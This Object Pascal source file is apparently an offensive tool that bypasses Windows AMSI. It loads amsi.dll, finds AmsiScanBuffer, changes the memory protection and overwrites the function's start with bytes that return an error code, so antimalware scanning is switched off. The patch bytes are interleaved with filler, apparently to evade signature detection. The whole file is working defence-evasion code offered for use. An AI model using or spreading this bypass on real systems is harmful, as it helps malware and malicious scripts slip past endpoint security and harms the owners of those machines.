program BasedAmsi_E;

{$APPTYPE CONSOLE}

{
P/Invoke AmsiScanBuffer RET patch written in Object Pascal
p4yl0ad

Inspo/Src
https://github.com/rasta-mouse
https://stackoverflow.com/questions/37380445/write-the-memory-of-my-own-process-without-using-writeprocessmemory
http://www.delphigroups.info/2/04/106991.html
}

uses
  SysUtils, Windows;

type
  TByteArr = array of Byte;

const
  Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
  AssTwo : Array[0..11] of byte = ($FF,$B8,$FF,$57,$FF,$00,$FF,$07,$FF,$80,$FF,$C3);
  //DeeL : Array[0..7] of char = ('a','m','s','i','.','d','l','l');
var
  BA, NBA: TByteArr;


function WriteBytes(pAddress: Pointer; Bytes: Array of Byte): Boolean;
var
  OldProtect , NewProtect : DWORD;
begin
  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
  begin
    Move(Bytes, pAddress^, Length(Bytes));
    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @NewProtect);
    Result := True;
  end
  else
  Result := False;
end;


function LoadAndFind(libtofind: PWideChar ): Pointer;
var
  lib : THandle;
  asb : Pointer;

begin
  lib := LoadLibrary(libtofind);
  if (lib <> 0) then begin
    asb := GetProcAddress(lib,'AmsiScanBuffer');
    WriteLn(Format('[+] dll base address: %p',[asb]));
    Result := asb;
  end;
end;


begin
var
  asbres : Pointer;

try


  asbres := LoadAndFind('amsi.dll');
  SetLength(BA,6);
  BA[0] := AssTwo[1];
  BA[1] := AssTwo[3];
  BA[2] := AssTwo[5];
  BA[3] := AssTwo[7];
  BA[4] := AssTwo[9];
  BA[5] := AssTwo[11];
  WriteBytes(asbres,BA);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
